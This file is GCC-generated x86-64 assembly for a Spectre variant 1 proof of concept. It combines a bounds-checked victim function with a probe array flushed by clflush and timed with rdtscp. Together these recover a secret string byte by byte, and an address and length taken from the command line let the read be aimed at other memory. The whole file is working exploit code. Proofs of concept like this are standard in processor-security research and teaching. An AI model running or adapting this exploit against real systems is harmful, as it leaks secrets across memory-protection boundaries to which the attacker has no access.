	.file	"spectre.c"
	.text
	.globl	check
	.type	check, @function
check:
.LFB5689:
	.cfi_startproc
	endbr64
	movl	array1_size(%rip), %eax
	cltq
	cmpq	%rdi, %rax
	seta	%al
	movzbl	%al, %eax
	ret
	.cfi_endproc
.LFE5689:
	.size	check, .-check
	.globl	leak_data
	.type	leak_data, @function
leak_data:
.LFB5690:
	.cfi_startproc
	endbr64
	movl	array1_size(%rip), %eax
	cltq
	cmpq	%rdi, %rax
	jbe	.L2
	xorb	$-1, %dil
	leaq	array1(%rip), %rax
	movzbl	(%rax,%rdi), %eax
	sall	$9, %eax
	cltq
	leaq	array2(%rip), %rdx
	movzbl	(%rdx,%rax), %eax
	andb	%al, temp(%rip)
.L2:
	ret
	.cfi_endproc
.LFE5690:
	.size	leak_data, .-leak_data
	.globl	victim_function
	.type	victim_function, @function
victim_function:
.LFB5691:
	.cfi_startproc
	endbr64
	call	leak_data
	ret
	.cfi_endproc
.LFE5691:
	.size	victim_function, .-victim_function
	.globl	readMemoryByte
	.type	readMemoryByte, @function
readMemoryByte:
.LFB5692:
	.cfi_startproc
	endbr64
	pushq	%r15
	.cfi_def_cfa_offset 16
	.cfi_offset 15, -16
	pushq	%r14
	.cfi_def_cfa_offset 24
	.cfi_offset 14, -24
	pushq	%r13
	.cfi_def_cfa_offset 32
	.cfi_offset 13, -32
	pushq	%r12
	.cfi_def_cfa_offset 40
	.cfi_offset 12, -40
	pushq	%rbp
	.cfi_def_cfa_offset 48
	.cfi_offset 6, -48
	pushq	%rbx
	.cfi_def_cfa_offset 56
	.cfi_offset 3, -56
	subq	$56, %rsp
	.cfi_def_cfa_offset 112
	movq	%rdi, 8(%rsp)
	movq	%rsi, 16(%rsp)
	movq	%rdx, 24(%rsp)
	movq	%fs:40, %rax
	movq	%rax, 40(%rsp)
	xorl	%eax, %eax
	movl	$0, 32(%rsp)
	leaq	results.0(%rip), %rax
	leaq	1024(%rax), %rdx
.L6:
	movl	$0, (%rax)
	addq	$4, %rax
	cmpq	%rax, %rdx
	jne	.L6
	movl	$999, (%rsp)
	leaq	131072+array2(%rip), %r13
	leaq	-131072(%r13), %r12
	leaq	array1(%rip), %r14
	jmp	.L7
.L9:
	movslq	%ebx, %rax
	imulq	$715827883, %rax, %rax
	shrq	$32, %rax
	movl	%ebx, %edx
	sarl	$31, %edx
	subl	%edx, %eax
	leal	(%rax,%rax,2), %edx
	addl	%edx, %edx
	movl	%ebx, %eax
	subl	%edx, %eax
	subl	$1, %eax
	movw	$0, %ax
	cltq
	movq	%rax, %rdi
	shrq	$16, %rdi
	orq	%rax, %rdi
	andq	%rbp, %rdi
	xorq	%r15, %rdi
	call	victim_function
	subl	$1, %ebx
	cmpl	$-1, %ebx
	je	.L30
.L11:
	clflush	array1_size(%rip)
	movl	$0, 36(%rsp)
	movl	36(%rsp), %eax
	cmpl	$99, %eax
	jg	.L9
.L10:
	movl	36(%rsp), %eax
	addl	$1, %eax
	movl	%eax, 36(%rsp)
	movl	36(%rsp), %eax
	cmpl	$99, %eax
	jle	.L10
	jmp	.L9
.L30:
	movl	4(%rsp), %ebp
	movl	$13, %esi
	leaq	results.0(%rip), %r9
	jmp	.L13
.L32:
	movslq	%r8d, %r8
	addl	$1, (%r9,%r8,4)
.L12:
	addl	$167, %esi
	cmpl	$42765, %esi
	je	.L31
.L13:
	movzbl	%sil, %r8d
	movl	%r8d, %r10d
	sall	$9, %r10d
	rdtscp
	movq	%rax, %rdi
	movl	%ecx, 32(%rsp)
	salq	$32, %rdx
	orq	%rdx, %rdi
	movslq	%r10d, %r10
	movzbl	(%r12,%r10), %eax
	rdtscp
	movl	%ecx, 32(%rsp)
	salq	$32, %rdx
	orq	%rdx, %rax
	subq	%rdi, %rax
	cmpq	$100, %rax
	ja	.L12
	movl	array1_size(%rip), %ecx
	movl	%ebp, %eax
	cltd
	idivl	%ecx
	movslq	%edx, %rdx
	movzbl	(%r14,%rdx), %eax
	cmpl	%r8d, %eax
	jne	.L32
	jmp	.L12
.L31:
	movl	$1, %eax
	movl	$0, %edx
	leaq	results.0(%rip), %rsi
	jmp	.L14
.L20:
	movl	%edx, %ebx
	movl	%ecx, %edx
.L15:
	addq	$1, %rax
.L14:
	movl	%eax, %ecx
	cmpq	$256, %rax
	je	.L33
	testl	%edx, %edx
	js	.L20
	movl	(%rsi,%rax,4), %edi
	movslq	%edx, %r8
	cmpl	(%rsi,%r8,4), %edi
	jge	.L21
	testl	%ebx, %ebx
	js	.L22
	movslq	%ebx, %r8
	cmpl	(%rsi,%r8,4), %edi
	cmovge	%ecx, %ebx
	jmp	.L15
.L21:
	movl	%edx, %ebx
	movl	%ecx, %edx
	jmp	.L15
.L22:
	movl	%ecx, %ebx
	jmp	.L15
.L33:
	leaq	results.0(%rip), %rcx
	movslq	%ebx, %rax
	movl	(%rcx,%rax,4), %eax
	movslq	%edx, %rsi
	movl	(%rcx,%rsi,4), %ecx
	leal	4(%rax,%rax), %esi
	cmpl	%ecx, %esi
	jl	.L17
	testl	%eax, %eax
	jne	.L23
	cmpl	$2, %ecx
	je	.L17
.L23:
	subl	$1, (%rsp)
	je	.L17
.L7:
	movl	(%rsp), %ebp
	leaq	array2(%rip), %rax
.L8:
	clflush	(%rax)
	addq	$512, %rax
	cmpq	%r13, %rax
	jne	.L8
	movl	array1_size(%rip), %ecx
	movl	%ebp, %eax
	cltd
	idivl	%ecx
	movslq	%edx, %r15
	movl	$29, %ebx
	movq	8(%rsp), %rax
	xorq	%r15, %rax
	movl	%ebp, 4(%rsp)
	movq	%rax, %rbp
	jmp	.L11
.L17:
	leaq	results.0(%rip), %rcx
	movl	results.0(%rip), %eax
	xorl	32(%rsp), %eax
	movl	%eax, results.0(%rip)
	movq	16(%rsp), %rsi
	movb	%dl, (%rsi)
	movslq	%edx, %rdx
	movl	(%rcx,%rdx,4), %eax
	movq	24(%rsp), %rdi
	movl	%eax, (%rdi)
	movb	%bl, 1(%rsi)
	movslq	%ebx, %rbx
	movl	(%rcx,%rbx,4), %eax
	movl	%eax, 4(%rdi)
	movq	40(%rsp), %rax
	subq	%fs:40, %rax
	jne	.L34
	addq	$56, %rsp
	.cfi_remember_state
	.cfi_def_cfa_offset 56
	popq	%rbx
	.cfi_def_cfa_offset 48
	popq	%rbp
	.cfi_def_cfa_offset 40
	popq	%r12
	.cfi_def_cfa_offset 32
	popq	%r13
	.cfi_def_cfa_offset 24
	popq	%r14
	.cfi_def_cfa_offset 16
	popq	%r15
	.cfi_def_cfa_offset 8
	ret
.L34:
	.cfi_restore_state
	call	__stack_chk_fail@PLT
	.cfi_endproc
.LFE5692:
	.size	readMemoryByte, .-readMemoryByte
	.section	.rodata.str1.1,"aMS",@progbits,1
.LC0:
	.string	"Success"
.LC1:
	.string	"Unclear"
	.section	.rodata.str1.8,"aMS",@progbits,1
	.align 8
.LC2:
	.string	"Putting '%s' in memory, address %p\n"
	.section	.rodata.str1.1
.LC3:
	.string	"%p"
.LC4:
	.string	"%d"
	.section	.rodata.str1.8
	.align 8
.LC5:
	.string	"Trying malicious_x = %p, len = %d\n"
	.section	.rodata.str1.1
.LC6:
	.string	"Reading %d bytes:\n"
	.section	.rodata.str1.8
	.align 8
.LC7:
	.string	"Reading at malicious_x = %p secc= %c ..."
	.section	.rodata.str1.1
.LC8:
	.string	"%s: "
.LC9:
	.string	"0x%02X='%c' score=%d "
	.section	.rodata.str1.8
	.align 8
.LC10:
	.string	"(second best: 0x%02X='%c' score=%d)"
	.section	.rodata.str1.1
.LC11:
	.string	"\n"
.LC12:
	.string	"addr = %llx, pid = %d\n"
	.text
	.globl	main
	.type	main, @function
main:
.LFB5693:
	.cfi_startproc
	endbr64
	pushq	%r15
	.cfi_def_cfa_offset 16
	.cfi_offset 15, -16
	pushq	%r14
	.cfi_def_cfa_offset 24
	.cfi_offset 14, -24
	pushq	%r13
	.cfi_def_cfa_offset 32
	.cfi_offset 13, -32
	pushq	%r12
	.cfi_def_cfa_offset 40
	.cfi_offset 12, -40
	pushq	%rbp
	.cfi_def_cfa_offset 48
	.cfi_offset 6, -48
	pushq	%rbx
	.cfi_def_cfa_offset 56
	.cfi_offset 3, -56
	subq	$72, %rsp
	.cfi_def_cfa_offset 128
	movl	%edi, 4(%rsp)
	movq	%rsi, 8(%rsp)
	movq	%fs:40, %rax
	movq	%rax, 56(%rsp)
	xorl	%eax, %eax
.L36:
	movq	stdin(%rip), %rdi
	call	getc@PLT
	cmpb	$114, %al
	je	.L55
	cmpb	$10, %al
	je	.L36
	cmpb	$105, %al
	jne	.L47
	movl	$0, %eax
	call	getpid@PLT
	movl	%eax, %ecx
	leaq	33+check(%rip), %rdx
	leaq	.LC12(%rip), %rsi
	movl	$1, %edi
	movl	$0, %eax
	call	__printf_chk@PLT
	jmp	.L36
.L55:
	movq	secret(%rip), %rdx
	movq	%rdx, %rcx
	leaq	.LC2(%rip), %rsi
	movl	$1, %edi
	movl	$0, %eax
	call	__printf_chk@PLT
	movq	secret(%rip), %rdi
	movq	%rdi, %rax
	leaq	array1(%rip), %rbx
	subq	%rbx, %rax
	movq	%rax, 32(%rsp)
	call	strlen@PLT
	movl	%eax, 28(%rsp)
	leaq	array2(%rip), %rax
	leaq	131072(%rax), %rdx
.L38:
	movb	$1, (%rax)
	addq	$1, %rax
	cmpq	%rdx, %rax
	jne	.L38
	cmpl	$3, 4(%rsp)
	je	.L56
.L39:
	movl	28(%rsp), %edx
	leaq	.LC6(%rip), %rsi
	movl	$1, %edi
	movl	$0, %eax
	call	__printf_chk@PLT
	movl	28(%rsp), %eax
	subl	$1, %eax
	movl	%eax, 28(%rsp)
	js	.L36
	movl	$0, %ebp
	leaq	.LC7(%rip), %r15
	leaq	.LC0(%rip), %r14
	leaq	.LC1(%rip), %r13
	jmp	.L45
.L56:
	leaq	32(%rsp), %rdx
	movq	8(%rsp), %rbx
	movq	8(%rbx), %rdi
	leaq	.LC3(%rip), %rsi
	movl	$0, %eax
	call	__isoc99_sscanf@PLT
	leaq	array1(%rip), %rax
	subq	%rax, 32(%rsp)
	leaq	28(%rsp), %rdx
	movq	16(%rbx), %rdi
	leaq	.LC4(%rip), %rsi
	movl	$0, %eax
	call	__isoc99_sscanf@PLT
	movl	28(%rsp), %ecx
	movq	32(%rsp), %rdx
	leaq	.LC5(%rip), %rsi
	movl	$1, %edi
	movl	$0, %eax
	call	__printf_chk@PLT
	jmp	.L39
.L43:
	leaq	.LC11(%rip), %rsi
	movl	$1, %edi
	movl	$0, %eax
	call	__printf_chk@PLT
	movl	28(%rsp), %eax
	subl	$1, %eax
	movl	%eax, 28(%rsp)
	addq	$1, %rbp
	testl	%eax, %eax
	js	.L36
.L45:
	movb	$1, flag(%rip)
	movq	secret(%rip), %rax
	movsbl	(%rax,%rbp), %ecx
	movq	32(%rsp), %rdx
	movq	%r15, %rsi
	movl	$1, %edi
	movl	$0, %eax
	call	__printf_chk@PLT
	leaq	44(%rsp), %rdx
	leaq	54(%rsp), %rsi
	movq	32(%rsp), %rdi
	xorb	$-1, %dil
	call	readMemoryByte
	addq	$1, 32(%rsp)
	movl	44(%rsp), %r12d
	movl	48(%rsp), %ebx
	leal	(%rbx,%rbx), %eax
	cmpl	%eax, %r12d
	movq	%r13, %rdx
	cmovge	%r14, %rdx
	leaq	.LC8(%rip), %rsi
	movl	$1, %edi
	movl	$0, %eax
	call	__printf_chk@PLT
	movzbl	54(%rsp), %edx
	leal	-32(%rdx), %eax
	cmpb	$94, %al
	movl	$63, %ecx
	cmovbe	%edx, %ecx
	movzbl	%cl, %ecx
	movzbl	%dl, %edx
	movl	%r12d, %r8d
	leaq	.LC9(%rip), %rsi
	movl	$1, %edi
	movl	$0, %eax
	call	__printf_chk@PLT
	testl	%ebx, %ebx
	jle	.L43
	movzbl	55(%rsp), %edx
	leal	-32(%rdx), %eax
	cmpb	$94, %al
	movl	$63, %ecx
	cmovbe	%edx, %ecx
	movzbl	%cl, %ecx
	movzbl	%dl, %edx
	movl	%ebx, %r8d
	leaq	.LC10(%rip), %rsi
	movl	$1, %edi
	movl	$0, %eax
	call	__printf_chk@PLT
	jmp	.L43
.L47:
	movq	56(%rsp), %rax
	subq	%fs:40, %rax
	jne	.L57
	movl	$0, %eax
	addq	$72, %rsp
	.cfi_remember_state
	.cfi_def_cfa_offset 56
	popq	%rbx
	.cfi_def_cfa_offset 48
	popq	%rbp
	.cfi_def_cfa_offset 40
	popq	%r12
	.cfi_def_cfa_offset 32
	popq	%r13
	.cfi_def_cfa_offset 24
	popq	%r14
	.cfi_def_cfa_offset 16
	popq	%r15
	.cfi_def_cfa_offset 8
	ret
.L57:
	.cfi_restore_state
	call	__stack_chk_fail@PLT
	.cfi_endproc
.LFE5693:
	.size	main, .-main
	.local	results.0
	.comm	results.0,1024,32
	.globl	flag
	.bss
	.type	flag, @object
	.size	flag, 1
flag:
	.zero	1
	.globl	temp
	.type	temp, @object
	.size	temp, 1
temp:
	.zero	1
	.globl	secret
	.section	.rodata.str1.8
	.align 8
.LC13:
	.string	"The Magic Words are Squeamish Ossifrage."
	.section	.data.rel.local,"aw"
	.align 8
	.type	secret, @object
	.size	secret, 8
secret:
	.quad	.LC13
	.globl	array2
	.bss
	.align 32
	.type	array2, @object
	.size	array2, 131072
array2:
	.zero	131072
	.globl	unused2
	.align 32
	.type	unused2, @object
	.size	unused2, 64
unused2:
	.zero	64
	.globl	array1
	.data
	.align 32
	.type	array1, @object
	.size	array1, 160
array1:
	.string	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	143
	.globl	unused1
	.bss
	.align 32
	.type	unused1, @object
	.size	unused1, 64
unused1:
	.zero	64
	.globl	array1_size
	.data
	.align 4
	.type	array1_size, @object
	.size	array1_size, 4
array1_size:
	.long	16
	.ident	"GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0"
	.section	.note.GNU-stack,"",@progbits
	.section	.note.gnu.property,"a"
	.align 8
	.long	1f - 0f
	.long	4f - 1f
	.long	5
0:
	.string	"GNU"
1:
	.align 8
	.long	0xc0000002
	.long	3f - 2f
2:
	.long	0x3
3:
	.align 8
4:
